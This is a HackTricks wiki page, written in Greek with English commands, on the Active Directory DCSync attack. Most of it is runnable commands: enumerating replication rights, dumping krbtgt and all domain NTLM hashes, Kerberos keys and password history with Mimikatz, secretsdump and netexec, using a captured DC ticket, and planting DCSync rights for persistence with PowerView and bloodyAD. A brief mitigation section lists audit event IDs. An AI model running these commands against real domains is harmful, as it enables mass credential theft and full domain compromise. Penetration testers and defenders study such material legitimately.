# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Το **DCSync** permission υποδηλώνει ότι υπάρχουν αυτά τα permissions πάνω στο ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.

**Σημαντικές Σημειώσεις για το DCSync:**

- Το **DCSync attack προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλα Domain Controllers να κάνουν replicate πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Επειδή το MS-DRSR είναι έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί ή να disabled.
- Από προεπιλογή μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** έχουν τα απαιτούμενα privileges.
- Στην πράξη, το **full DCSync** χρειάζεται **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** στο domain naming context. Το `DS-Replication-Get-Changes-In-Filtered-Set` συνήθως delegated μαζί τους, αλλά από μόνο του είναι πιο σχετικό με το syncing **confidential / RODC-filtered attributes** (για παράδειγμα legacy LAPS-style secrets) παρά με ένα full krbtgt dump.
- Αν κάποιο account passwords είναι stored με reversible encryption, υπάρχει διαθέσιμη επιλογή στο Mimikatz για να επιστρέψει το password σε clear text

### Enumeration

Check who has these permissions using `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Αν θέλετε να εστιάσετε σε **μη προεπιλεγμένους principals** με δικαιώματα DCSync, φιλτράρετε τις ενσωματωμένες ομάδες με δυνατότητα replication και ελέγξτε μόνο τους απρόσμενους trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Εκμετάλλευση Τοπικά
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Εκμετάλλευση Απομακρυσμένα
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Πρακτικά παραδείγματα με περιορισμένο scope:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

Σε σενάρια unconstrained-delegation export-mode, μπορείς να καταγράψεις ένα Domain Controller machine TGT (π.χ. `DC1$@DOMAIN` για `krbtgt@DOMAIN`). Στη συνέχεια, μπορείς να χρησιμοποιήσεις αυτό το ccache για να αυθεντικοποιηθείς ως το DC και να εκτελέσεις DCSync χωρίς κωδικό πρόσβασης.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Σημειώσεις λειτουργίας:

- **Η Kerberos διαδρομή του Impacket αγγίζει πρώτα το SMB** πριν από το DRSUAPI call. Αν το περιβάλλον επιβάλλει **SPN target name validation**, ένα πλήρες dump μπορεί να αποτύχει με `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Σε αυτή την περίπτωση, είτε ζήτησε πρώτα ένα service ticket **`cifs/<dc>`** για το target DC είτε κάνε fallback στο **`-just-dc-user`** για τον λογαριασμό που χρειάζεσαι άμεσα.
- Όταν έχεις μόνο lower replication rights, το LDAP/DirSync-style syncing μπορεί ακόμα να αποκαλύψει **confidential** ή **RODC-filtered** attributes (για παράδειγμα legacy `ms-Mcs-AdmPwd`) χωρίς πλήρη krbtgt replication.

Το `-just-dc` δημιουργεί 3 αρχεία:

- ένα με τα **NTLM hashes**
- ένα με τα **Kerberos keys**
- ένα με cleartext passwords από το NTDS για οποιουσδήποτε λογαριασμούς έχουν ενεργοποιημένο το [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείς να βρεις χρήστες με reversible encryption με

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Αν είσαι domain admin, μπορείς να δώσεις αυτά τα permissions σε οποιονδήποτε χρήστη με τη βοήθεια του `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Οι χρήστες Linux μπορούν να κάνουν το ίδιο με το `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Στη συνέχεια, μπορείτε να **ελέγξετε αν ο χρήστης έχει εκχωρηθεί σωστά** τα 3 privileges αναζητώντας τα στην έξοδο του (θα πρέπει να μπορείτε να δείτε τα ονόματα των privileges μέσα στο πεδίο "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Μετριασμός

- Security Event ID 4662 (Audit Policy for object must be enabled) – Πραγματοποιήθηκε μια ενέργεια σε ένα object
- Security Event ID 5136 (Audit Policy for object must be enabled) – Ένα object του directory service τροποποιήθηκε
- Security Event ID 4670 (Audit Policy for object must be enabled) – Τα permissions σε ένα object άλλαξαν
- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
